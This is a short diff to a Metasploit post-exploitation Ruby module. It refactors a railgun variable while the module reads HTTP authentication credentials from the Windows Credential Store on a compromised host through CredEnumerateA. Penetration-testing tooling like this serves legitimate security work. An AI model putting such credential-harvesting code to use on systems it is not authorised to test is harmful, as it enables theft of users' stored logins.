@@ -239,7 +239,6 @@ class MetasploitModule < Msf::Post
     )
 
     # set up vars
-    rg = session.railgun
     host = session.sys.config.sysinfo
     @hist_col = []
 
@@ -344,7 +343,7 @@ class MetasploitModule < Msf::Post
     # get creds from credential store
     print_status("Looking in the Credential Store for HTTP Authentication Creds...")
     # get data from credential store
-    ret = rg.advapi32.CredEnumerateA(nil, 0, 4, 4)
+    ret = session.railgun.advapi32.CredEnumerateA(nil, 0, 4, 4)
     p_to_arr = ret["Credentials"].unpack("V")
     arr_len = ret["Count"] * 4 if is_86
     arr_len = ret["Count"] * 8 unless is_86
